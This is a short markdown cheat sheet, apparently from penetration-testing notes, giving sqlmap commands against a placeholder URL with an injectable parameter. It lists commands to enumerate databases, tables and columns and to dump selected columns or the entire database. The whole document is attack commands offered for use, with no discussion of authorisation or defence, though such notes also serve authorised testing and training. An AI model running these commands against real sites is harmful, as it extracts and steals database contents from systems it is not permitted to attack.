# Use sqlmap

## Command

Get database name

```bash
sqlmap -u "http://site/?param=vuln*" --thread 10 -v 6 --dbs
```

Get Tables

```bash
sqlmap -u "http://site/?param=vuln*" --thread 10 -v 6 -D <db_name> --tables
```

Get Column

```bash
sqlmap -u "http://site/?param=vuln*" --thread 10 -v 6 -D <db_name> -T <table_name> --column
```

Dump Data

```bash
sqlmap -u "http://site/?param=vuln*" --thread 10 -v 6 -D <db_name> -T <table_name> -C <column_name>,<column_name> --dump
```

Dump ALL

```bash
sqlmap -u "http://site/?param=vuln*" --thread 10 -v 6 --dump
```
